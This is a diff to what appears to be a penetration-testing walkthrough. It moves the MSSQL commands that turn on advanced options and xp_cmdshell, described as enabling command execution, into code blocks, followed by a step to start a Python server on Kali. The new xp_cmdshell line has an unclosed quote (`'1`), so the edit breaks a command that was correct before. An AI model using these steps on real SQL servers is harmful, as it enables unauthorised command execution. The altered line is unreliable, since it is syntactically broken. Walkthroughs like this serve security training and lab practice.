@@ -148,14 +148,18 @@ Copy this script over to your working directory, open it, and add the following 
 
 Next, over at the SQL server we need to enable advanced options:
 
-`sp_configure 'show advanced options', '1'`
-`RECONFIGURE`
+```mssql
+sp_configure 'show advanced options', '1'
+RECONFIGURE
+```
 
 
 Now we can enable command execution with:
 
-`sp_configure 'xp_cmdshell', '1'`
-`RECONFIGURE`
+```mssql
+sp_configure 'xp_cmdshell', '1
+RECONFIGURE
+```
 
 On your kali start a python server:
 
